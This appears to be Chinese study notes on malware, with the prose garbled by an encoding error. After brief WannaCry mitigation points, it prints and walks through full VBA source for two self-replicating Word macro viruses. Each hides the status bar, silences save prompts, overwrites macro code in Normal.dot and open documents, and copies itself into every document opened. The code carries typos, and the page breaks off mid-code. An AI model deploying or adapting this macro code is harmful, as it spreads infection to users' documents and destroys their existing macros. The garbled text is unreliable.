è¯¥ç—…æ¯’åˆ©ç”¨äº†æ°¸æ’ä¹‹è“çš„æ¼æ´ï¼Œå¾®è½¯å®˜æ–¹æä¾›äº†ç›¸åº”çš„è¡¥ä¸æ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å°½å¿«å®‰å…¨æ›´æ–°çš„æ–¹å¼é˜²æ­¢å—åˆ°é’ˆå¯¹æ­¤æ¼æ´çš„ç—…æ¯’çš„æ”»å‡»</p></li><li><p>ç»è¿‡æˆ‘ä»¬åˆ†æå¾—çŸ¥ï¼Œè¯¥ç—…æ¯’çš„ä¼ æ’­ä¸»è¦æ˜¯åˆ©ç”¨äº† 445<br> ç«¯å£å‘é€ç—…æ¯’æœ¬ä½“ï¼Œå…³é—­ç«¯å£å¯ä»¥é˜²æ­¢æˆ‘ä»¬è¢«æ”»å‡»ã€‚</p></li><li><p>åœ¨åˆ†æç—…æ¯’ exe æ–‡ä»¶æ—¶ï¼Œç—…æ¯’åŠ å¯†å™¨åœ¨<br> åŠ å¯†å‰ä¼šè¿›è¡Œäº’æ–¥ä½“æ£€æµ‹ã€‚æ£€æµ‹æ˜¯å¦å·²ç»æœ‰åŠ å¯†å™¨ç¨‹åºå­˜åœ¨ï¼Œè¿™æ˜¯åˆ›å»ºäº†äº’æ–¥ä½“<br> MsWinZonesCacheCounterMutexA<br> ï¼Œå®‰å…¨è½¯ä»¶å¯ä»¥é¢„å…ˆåˆ›å»ºäº’æ–¥ä½“ï¼Œè¿™æ ·åŠ å¯†å™¨åœ¨åŠ å¯†å‰å°±ä¼šè‡ªåŠ¨æ¨å‡ºï¼Œä¸ä¼šè¿›è¡ŒåŠ å¯†</p></li></ol><h1 id="11-å­¦ä¹ ç¬”è®°ï¼š"><a href="#11-å­¦ä¹ ç¬”è®°ï¼š" class="headerlink" title="11 å­¦ä¹ ç¬”è®°ï¼š"></a>11 å­¦ä¹ ç¬”è®°ï¼š</h1><h3 id="å¾®è½¯-å®ç—…æ¯’"><a href="#å¾®è½¯-å®ç—…æ¯’" class="headerlink" title="å¾®è½¯ å®ç—…æ¯’"></a>å¾®è½¯ å®ç—…æ¯’</h3><p>ç—…æ¯’ä¸»ä½“</p><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#39; Micro-Virus</span><br><span class="line"></span><br><span class="line">Sub Document_Open()</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line"></span><br><span class="line">Application. DisplayStatusBar&#x3D;False &#39;å±è”½çŠ¶æ€æ </span><br><span class="line"></span><br><span class="line">Options. SaveNormalPrompt&#x3D;False</span><br><span class="line">&#39;ä¿®æ”¹å…¬ç”¨æ¨¡æ¿æ—¶åœ¨åå°è‡ªåŠ¨ä¿å­˜ï¼Œä¸ç»™ä»»ä½•æç¤º</span><br><span class="line"></span><br><span class="line">Ourcode &#x3D;ThisDocument. VBProject. VBComponents(1). CodeModule.</span><br><span class="line">Lines(1,100)</span><br><span class="line"></span><br><span class="line">&#39;è·å–å½“å‰æ–‡æ¡£ä»£ç å¯¹è±¡</span><br><span class="line"></span><br><span class="line">Set Host &#x3D;NormalTemplate. VBProject. VBComponents(1). CodeModule</span><br><span class="line"></span><br><span class="line">&#39;è·å–å…±ç”¨æ¨¡æ¿çš„ä»£ç å¯¹è±¡</span><br><span class="line"></span><br><span class="line">If ThisDocument &#x3D;NormalTemplate Then</span><br><span class="line">&#39;åˆ¤æ–­å½“å‰æ–‡ä»¶æ˜¯å¦ç­‰äºå…¬ç”¨æ¨¡æ¿å¯¹è±¡</span><br><span class="line"></span><br><span class="line">Set Host&#x3D;ActiveDocument. VBPro ject. VBComponents(1). CodeModule</span><br><span class="line"></span><br><span class="line">&#39;å¦‚æœæ˜¯ï¼Œåˆ™è·å–å½“å‰æ´»åŠ¨æ–‡æ¡£çš„ä»£ç å¯¹è±¡</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">With Host</span><br><span class="line"></span><br><span class="line">If. Lines(1.1)&lt;&gt;&quot;Micro-Virus&quot;Then &#39;åˆ¤æ–­å½“å‰æ–‡æ¡£æ˜¯å¦æ„ŸæŸ“ç—…æ¯’</span><br><span class="line"></span><br><span class="line">. Deletelines 1,. CountOfLines &#39;å¦‚æœä¸æ˜¯ï¼Œå°±æ¸…é™¤åŸæ¥çš„ä»£ç </span><br><span class="line"></span><br><span class="line">. Insertlines 1, Ourcode&#39;åµŒå…¥ç—…æ¯’ä»£ç </span><br><span class="line"></span><br><span class="line">. Replaceline 2,&quot;Sub Document_Close()&quot;&#39;æ›´æ¢</span><br><span class="line"></span><br><span class="line">If ThisDocument&#x3D;nomaltemplate Then &#39;åˆ¤æ–­å½“å‰çš„æ–‡æ¡£æ˜¯å¦æ˜¯å…¬ç”¨æ¨¡å—</span><br><span class="line"></span><br><span class="line">. ReplaceLine 2,&quot;Sub Document_Open()&quot;</span><br><span class="line"></span><br><span class="line">ActiveDocument. SaveAs ActiveDocument. FullName</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">End With</span><br><span class="line"></span><br><span class="line">MsgBox &quot;MicroVirus by Content Security Lab&quot;</span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><h3 id="ç—…æ¯’åˆ†æ"><a href="#ç—…æ¯’åˆ†æ" class="headerlink" title="ç—…æ¯’åˆ†æ"></a>ç—…æ¯’åˆ†æ</h3><p>2.4è¯¥ä»£ç çš„åŸºæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š<br>1ï¼‰è¿›è¡Œå¿…è¦çš„è‡ªæˆ‘ä¿æŠ¤ã€‚é«˜æ˜çš„ç—…æ¯’ç¼–å†™è€…å…¶è‡ªæˆ‘ä¿æŠ¤å°†åšå¾—éå¸¸å¥½ï¼Œå¯ä»¥ä½¿wordçš„ä¸€äº›å·¥å…·æ å¤±æ•ˆï¼Œä¾‹å¦‚å°†å·¥å…·èœå•ä¸­çš„å®é€‰é¡¹å±è”½ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨è¾¾åˆ°å¾ˆå¥½çš„éšè—æ•ˆæœã€‚æœ¬ä¾‹ä¸­åªæ˜¯å±è”½çŠ¶æ€æ ï¼Œä»¥å…æ˜¾ç¤ºå®çš„è¿è¡ŒçŠ¶æ€ï¼Œå¹¶ä¸”ä¿®æ”¹å…¬ç”¨æ¨¡æ¿æ—¶è‡ªåŠ¨ä¿å­˜ï¼Œä¸ç»™ç”¨æˆ·æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Application.DisplayStatusBar&#x3D;False Options.SaveNormalPrompt&#x3D;False</span><br></pre></td></tr></table></figure><p>2ï¼‰å¾—åˆ°å½“å‰æ–‡æ¡£çš„ä»£ç å¯¹è±¡å’Œå…¬ç”¨æ¨¡æ¿çš„ä»£ç å¯¹è±¡ã€‚</p><p>2ï¼‰å¾—åˆ°å½“å‰æ–‡æ¡£çš„ä»£ç å¯¹è±¡å’Œå…¬ç”¨æ¨¡æ¿çš„ä»£ç å¯¹è±¡ã€‚</p><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Ourcode&#x3D;ThisDocument.VBProject.VBComponentsï¼ˆ1ï¼‰.CodeModule.Linesï¼ˆ1ï¼Œ100ï¼‰</span><br><span class="line"></span><br><span class="line">Set Host&#x3D;NormalTemplate.VBPro ject.VBComponentsï¼ˆ1ï¼‰.CodeModule</span><br><span class="line"></span><br><span class="line">If ThisDocument &#x3D;NormalTemplate Then</span><br><span class="line"></span><br><span class="line">Set Host&#x3D;ActiveDocument.VBProject.VBComponentsï¼ˆ1ï¼‰.CodeModule</span><br><span class="line"></span><br><span class="line">End If</span><br></pre></td></tr></table></figure><p>3ï¼‰æ£€æŸ¥æ¨¡æ¿æ˜¯å¦å·²ç»æ„ŸæŸ“ç—…æ¯’ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™å¤åˆ¶å®ç—…æ¯’ä»£ç åˆ°æ¨¡æ¿ï¼Œå¹¶ä¸”ä¿®æ”¹å‡½æ•°åã€‚</p><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">With Host</span><br><span class="line"></span><br><span class="line">If.Linesï¼ˆ1.1ï¼‰&lt;ï¼‰&quot;&quot;Micro-Virus&quot;Then</span><br><span class="line"></span><br><span class="line">.Deletelines 1ï¼Œ.CountOfLines</span><br><span class="line"></span><br><span class="line">.InsertLines 1ï¼ŒOurcode</span><br><span class="line"></span><br><span class="line">.ReplaceLine 2ï¼Œ&quot;Sub Document_Closeï¼ˆï¼‰&quot;</span><br><span class="line"></span><br><span class="line">If ThisDocument&#x3D;nomaltemplate Then</span><br><span class="line"></span><br><span class="line">.ReplaceLine 2ï¼Œ&quot;Sub Document_openï¼ˆï¼‰&quot;</span><br><span class="line"></span><br><span class="line">ActiveDocument.SaveAs ActiveDocument.Ful1Name</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">End With</span><br></pre></td></tr></table></figure><p>4ï¼‰æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MsgBox&quot;MicroVirus by Content Security Lab&quot;</span><br></pre></td></tr></table></figure><p>2.5æ­¤æ—¶å½“å‰wordæ–‡æ¡£å°±å«æœ‰å®ç—…æ¯’ï¼Œåªè¦ä¸‹æ¬¡æ‰“å¼€è¿™ä¸ªwordæ–‡æ¡£ï¼Œå°±ä¼šæ‰§è¡Œä»¥ä¸Šä»£ç ï¼Œå¹¶å°†è‡ªèº«å¤åˆ¶åˆ°Normal.dotï¼ˆwordæ–‡æ¡£çš„å…¬å…±æ¨¡æ¿ï¼‰å’Œå½“å‰æ–‡æ¡£çš„ThisDocumentä¸­ï¼ŒåŒæ—¶æ”¹å˜å‡½æ•°åï¼ˆæ¨¡æ¿ä¸­ä¸ºDocument<em>Closeï¼Œå½“å‰æ–‡æ¡£ä¸ºDocument</em>Openï¼‰ï¼Œæ­¤æ—¶æ‰€æœ‰çš„wordæ–‡æ¡£æ‰“å¼€å’Œå…³é—­æ—¶ï¼Œéƒ½å°†è¿è¡Œä»¥ä¸Šçš„ç—…æ¯’ä»£ç ï¼Œå¯ä»¥åŠ å…¥é€‚å½“çš„æ¶æ„ä»£ç ï¼Œå½±å“wordçš„æ­£å¸¸ä½¿ç”¨ï¼Œæœ¬ä¾‹ä¸­åªæ˜¯ç®€å•çš„è·³å‡ºä¸€ä¸ªæç¤ºæ¡†ã€‚å°†å½“å‰æ–‡æ¡£å…³é—­å†é‡æ–°æ‰“å¼€ï¼Œå¼¹å‡ºä¸€ä¸ªæç¤ºæ¡†ï¼Œä¸”å±è”½äº†çŠ¶æ€æ </p><h3 id="å®ç—…æ¯’åˆ†æ2"><a href="#å®ç—…æ¯’åˆ†æ2" class="headerlink" title="å®ç—…æ¯’åˆ†æ2"></a>å®ç—…æ¯’åˆ†æ2</h3><p>æ‰¾åˆ°ä¸€ä¸ªç±»ä¼¼äºç»™å‡ºç—…æ¯’çš„å®ç°å¹¶è¿›è¡Œåˆ†æ</p><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">&#39;moonlight</span><br><span class="line"></span><br><span class="line">Dim nm(4)</span><br><span class="line"></span><br><span class="line">Sub Smallboy_Virus()</span><br><span class="line"></span><br><span class="line">&#39;å±è”½çŠ¶æ€æ ï¼Œä»¥å…æ˜¾ç¤ºå®ç—…æ¯’æ‰§è¡ŒçŠ¶æ€ï¼›ä¿®æ”¹å…¬ç”¨æ¨¡ç‰ˆæ˜¯è‡ªåŠ¨ä¿å­˜ä¸”ä¸æç¤ºï¼›è‡ªåŠ¨æ‰§è¡Œç—…æ¯’æ¨¡æ¿</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line"></span><br><span class="line">Application.DisplayStatusBar &#x3D; False</span><br><span class="line"></span><br><span class="line">&#39;å±è”½çŠ¶æ€æ </span><br><span class="line"></span><br><span class="line">Options.SaveNormalPrompt &#x3D; False</span><br><span class="line"></span><br><span class="line">&#39;ä¿®æ”¹å…¬ç”¨æ¨¡æ¿æ—¶åœ¨åå°è‡ªåŠ¨ä¿å­˜ï¼Œä¸ç»™ä»»ä½•æç¤º</span><br><span class="line"></span><br><span class="line">Ourcode &#x3D; ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1,</span><br><span class="line">100)</span><br><span class="line"></span><br><span class="line">&#39;è·å–å½“å‰æ–‡æ¡£ä»£ç å¯¹è±¡</span><br><span class="line"></span><br><span class="line">Set host &#x3D; NormalTemplate.VBProject.VBComponents(1).CodeModule</span><br><span class="line"></span><br><span class="line">&#39;è·å–å…±ç”¨æ¨¡æ¿çš„ä»£ç å¯¹è±¡</span><br><span class="line"></span><br><span class="line">&#39;</span><br><span class="line"></span><br><span class="line">&#39;è·å–å½“å‰æ–‡æ¡£å¯¹è±¡ä»£ç å’Œå…±ç”¨æ¨¡æ¿å¯¹è±¡ä»£ç </span><br><span class="line"></span><br><span class="line">If ThisDocument &#x3D; NormalTemplate Then</span><br><span class="line"></span><br><span class="line">&#39;åˆ¤æ–­å½“å‰æ–‡ä»¶æ˜¯å¦ç­‰äºå…¬ç”¨æ¨¡æ¿å¯¹è±¡</span><br><span class="line"></span><br><span class="line">Set host &#x3D; ActiveDocument.VBProject.VBComponents(1).CodeModule</span><br><span class="line"></span><br><span class="line">&#39;å¦‚æœæ˜¯ï¼Œåˆ™è·å–å½“å‰æ´»åŠ¨æ–‡æ¡£çš„ä»£ç å¯¹è±¡</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">&#39;</span><br><span class="line"></span><br><span class="line">&#39;è®¾ç«‹æ£€æŸ¥å½“å‰æ–‡æ¡£æ˜¯å¦è¢«æ„ŸæŸ“ï¼Œå¦‚æœæ²¡æœ‰å°±è‡ªåŠ¨æ‰§è¡Œå¤åˆ¶å®ç—…æ¯’åˆ°æ¨¡æ¿å¹¶ä¿®æ”¹å‡½æ•°åæ“ä½œ</span><br><span class="line"></span><br><span class="line">With host</span><br><span class="line"></span><br><span class="line">If .Lines(1.1) &lt;&gt; &quot;Smallboy_Virus()&quot; Then</span><br><span class="line"></span><br><span class="line">&#39;åˆ¤æ–­å½“å‰æ–‡æ¡£æ˜¯å¦æ„ŸæŸ“ç—…æ¯’</span><br><span class="line"></span><br><span class="line">.deletelines 1, .countoflines</span><br><span class="line"></span><br><span class="line">&#39;å¦‚æœä¸æ˜¯ï¼Œå°±æ¸…é™¤åŸæ¥çš„ä»£ç </span><br><span class="line"></span><br><span class="line">.insertlines 1, .OurcodeLines</span><br><span class="line"></span><br><span class="line">&#39;åµŒå…¥ç—…æ¯’ä»£ç </span><br><span class="line"></span><br><span class="line">.replaceline 2, &quot;Sub Smallboy_Virus()&quot;</span><br><span class="line"></span><br><span class="line">&#39;æ›´æ¢ Smallboy_Virus</span><br><span class="line"></span><br><span class="line">If ThisDocument &#x3D; NormalTemplate Then</span><br><span class="line"></span><br><span class="line">&#39;åˆ¤æ–­å½“å‰çš„æ–‡æ¡£æ˜¯å¦ç­‰äºå…¬ç”¨æ¨¡å—</span><br><span class="line"></span><br><span class="line">.replaceline 2, &quot;Sub Smallboy_Virus()&quot;</span><br><span class="line"></span><br><span class="line">&#39;å¦‚æœæ˜¯ï¼Œåˆ™æ›¿æ¢ä¸º Smallboy_Virus</span><br><span class="line"></span><br><span class="line">ActiveDocument.SaveAs ActiveDpcument.FullName</span><br><span class="line"></span><br><span class="line">&#39;ä¿å­˜æ–‡æ¡£ï¼Œå¹¶ä¿®æ”¹å‡½æ•°åï¼ˆï¼‰</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">End With</span><br><span class="line"></span><br><span class="line">&#39;*å¼¹å‡ºç¬¬ä¸€ä¸ªæ¡†*</span><br><span class="line"></span><br><span class="line">MsgBox &quot;ï¼ï¼ï¼&quot;</span><br><span class="line"></span><br><span class="line">&#39;*å®šä¹‰ç®—æ•°æ•°æ®æˆå‘˜*</span><br><span class="line"></span><br><span class="line">Count &#x3D; 0 &#39;å®šä¹‰count&#x3D;0</span><br><span class="line"></span><br><span class="line">try: &#39;æ‰§è¡Œtryè¯­å¥</span><br><span class="line"></span><br><span class="line">On Error GoTo 0</span><br><span class="line"></span><br><span class="line">On Error GoTo try</span><br><span class="line"></span><br><span class="line">test &#x3D; -1 &#39;åˆå§‹åŒ–å¹¶å®šä¹‰text&#x3D;-1</span><br><span class="line"></span><br><span class="line">con &#x3D; 1 &#39;åˆå§‹åŒ–å¹¶å®šä¹‰con&#x3D;1</span><br><span class="line"></span><br><span class="line">tog$ &#x3D; &quot;&quot; &#39;åˆå§‹åŒ–tog$</span><br><span class="line"></span><br><span class="line">i &#x3D; 0 &#39;åˆå§‹åŒ–å¹¶å®šä¹‰i&#x3D;0</span><br><span class="line"></span><br><span class="line">&#39;å¼€å§‹æ‰§è¡Œç®—æœ¯æ•°æ®æˆå‘˜çš„è¡Œå¾ªç¯è¯­å¥</span><br><span class="line"></span><br><span class="line">While test &#x3D; -1</span><br><span class="line"></span><br><span class="line">&#39;å› ä¸ºä¹‹å‰å·²ç»å®šä¹‰äº†test&#x3D;-1ï¼Œæ‰€ä»¥è‚¯å®šä¼šå…ˆæ‰§è¡Œä¸€æ¬¡whileå¾ªç¯</span><br><span class="line"></span><br><span class="line">For i &#x3D; 0 To 4</span><br><span class="line"></span><br><span class="line">&#39;æ‰§è¡Œä¸€ä¸ªforå¾ªç¯</span><br><span class="line"></span><br><span class="line">nm(i) &#x3D; Int(Rnd() * 100)</span><br><span class="line"></span><br><span class="line">&#39;å°†rndï¼ˆï¼‰*100çš„æ­£æ•´æ•°ç»“æœèµ‹å€¼ç»™æ•°ç»„nmï¼ˆiï¼‰</span><br><span class="line"></span><br><span class="line">con &#x3D; con * nm(i)</span><br><span class="line"></span><br><span class="line">&#39;å°†con*nm(i)çš„å€¼ä¼ å›ç»™con</span><br><span class="line"></span><br><span class="line">If i &#x3D; 4 Then</span><br><span class="line"></span><br><span class="line">&#39;å¦‚æœi&#x3D;4,ä¹Ÿå°±æ˜¯forå¾ªç¯ç»“æŸä¹‹åï¼Œå¼€å§‹æ‰§è¡Œifä¸‹çš„è¯­å¥</span><br><span class="line"></span><br><span class="line">tog$ &#x3D; tog$ + Str$(nm(4)) + &quot;&#x3D;?&quot;</span><br><span class="line"></span><br><span class="line">&#39;å°†tog$å’ŒStr$( nm(4))+å­—ç¬¦ä¸²&quot;&#x3D;ï¼Ÿ&quot;çš„å€¼éƒ½ä¼ ç»™tog$</span><br><span class="line"></span><br><span class="line">GoTo beg &#39;æ‰§è¡Œbegè¯­å¥</span><br><span class="line"></span><br><span class="line">End If &#39;ä¸Šä¸€ä¸ªifåˆ¤æ–­è¯­å¥æ‰§è¡Œç»“æŸ</span><br><span class="line"></span><br><span class="line">tog$ &#x3D; tog$ + Str$(nm(i)) + &quot;*&quot;</span><br><span class="line"></span><br><span class="line">&#39;å°†tog$å’ŒStr$( nm(4))+å­—ç¬¦ä¸²&quot;*&quot;çš„å€¼éƒ½ä¼ ç»™tog$</span><br><span class="line"></span><br><span class="line">Next i &#39;è¿”å›forå¾ªç¯</span><br><span class="line"></span><br><span class="line">beg:</span><br><span class="line"></span><br><span class="line">&#39;æ˜¾ç¤ºç¬¬äºŒä¸ªå¯¹è¯æ¡†ï¼Œè¿›è¡Œç­”é¢˜åˆ¤æ–­</span><br><span class="line"></span><br><span class="line">Beep</span><br><span class="line"></span><br><span class="line">ans$ &#x3D; InputBox(&quot;ä»Šå¤©æ˜¯&quot; + Date$ + &quot;ï¼Œæˆ‘ä»¬ç©ä¸ªå¿ƒç®—æ¸¸æˆå¯å¥½ï¼Ÿ&quot; +</span><br><span class="line">Chr$(13) + &quot;å¦‚æœä½ ç­”é”™äº†ï¼Œ</span><br><span class="line"></span><br><span class="line">æˆ‘å°†ä»£è¡¨æœˆäº®æ¶ˆç­ä½ ï¼&quot; + Chr$(13) + tog$, &quot;Smallboy&quot;)</span><br><span class="line"></span><br><span class="line">&#39;æ˜¾ç¤ºå¿ƒç®—é¢˜ï¼Œå’Œè¾“å…¥å¿ƒç®—ç»“æœ</span><br><span class="line"></span><br><span class="line">&#39;*è¾“å…¥è¿ç®—ç»“æœåå°†è¦æ‰§è¡Œçš„è¯­å¥&#39;</span><br><span class="line"></span><br><span class="line">If RTrim$(LTrim$(ans$)) &#x3D; LTrim$(Str$(con)) Then</span><br><span class="line"></span><br><span class="line">&#39;åˆ¤æ–­ans$ä¸conæ˜¯å¦ç›¸ç­‰ï¼Œè¿™æ˜¯æ˜¯ä¸»è¦çš„ifåˆ¤æ–­è¯­å¥ï¼Œæ˜¯ä¸‹é¢è¿›è¡Œæ“ä½œçš„ä¸»è¦ä¾æ®</span><br><span class="line"></span><br><span class="line">&#39;è¾“å…¥ç­”æ¡ˆæ­£ç¡®åå°†è¦æ‰§è¡Œçš„è¯­å¥&#39;*</span><br><span class="line"></span><br><span class="line">MsgBox &quot;æ­å–œä½ ç­”å¯¹äº†ï¼ï¼ï¼&quot;</span><br><span class="line"></span><br><span class="line">&#39;è®¾ç½®æ–‡æœ¬æ ¼å¼ï¼Œå­—ä½“</span><br><span class="line"></span><br><span class="line">&#39;Documents.Add</span><br><span class="line"></span><br><span 